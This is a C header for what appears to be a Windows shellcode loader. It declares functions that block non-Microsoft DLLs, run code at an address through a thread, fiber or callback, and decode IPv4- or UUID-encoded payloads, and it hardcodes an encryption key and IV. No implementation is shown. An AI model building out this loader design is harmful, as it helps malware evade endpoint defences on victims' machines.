#pragma once
#include <Windows.h>

BOOL Local_blockdlls();

#ifdef EXECUTE_THREAD
BOOL Execute(PVOID addr, DWORD64 sizeofaddr);
#endif // EXECUTE_THREAD

#ifdef EXECUTE_FIBER
BOOL ExecuteFiber(PVOID addr, DWORD64 sizeofaddr);
#endif

#ifdef EXECUTE_CALLBACK
BOOL ExecuteCallback(PVOID addr, DWORD64 sizeofaddr);
#endif

#ifdef ENCODE_IPV4
BOOL InitIpv4Api();
#endif

#ifdef ENCODE_UUID
BOOL InitUuidApi();
BOOL LoadRpcrt4();
#endif




 const CHAR* keys = "Qy89qx3JP217Hkd1bQxv7GHLS5wcUVTi";
 const CHAR* iv = "3HEgOgSQcwYPAZsx";
